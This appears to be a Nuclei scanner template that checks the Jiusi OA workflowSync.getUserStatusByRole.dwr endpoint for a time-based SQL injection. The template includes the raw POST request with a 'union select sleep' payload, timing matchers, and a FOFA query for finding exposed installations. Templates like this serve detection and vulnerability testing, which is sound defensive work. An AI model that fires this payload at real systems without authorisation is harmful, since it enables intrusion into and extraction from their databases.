id: jsoa-workflowSync-getUserStatusByRole-dwr-sqli
info:
  name: 九思 OA workflowSync.getUserStatusByRole.dwr - sqli
  author: leadlife
  severity: high
  description: 北京九思协同办公软件 /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息
  reference: 
    - https://github.com/wy876/POC/blob/main/%E4%B9%9D%E6%80%9DOA/%E4%B9%9D%E6%80%9DOA%E7%B3%BB%E7%BB%9FworkflowSync.getUserStatusByRole.dwr%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    fofa-query: app="九思软件-OA" || body="/jsoa/webmail/ajax_util.js"
  tags: jsoa,sqli,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Connection: close

        callCount=1
        c0-scriptName=workflowSync
        c0-methodName=getUserStatusByRole
        c0-id=1
        c0-param0=string:1
        c0-param1=string:1 union select 0,sleep(6)#
        xml=true
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and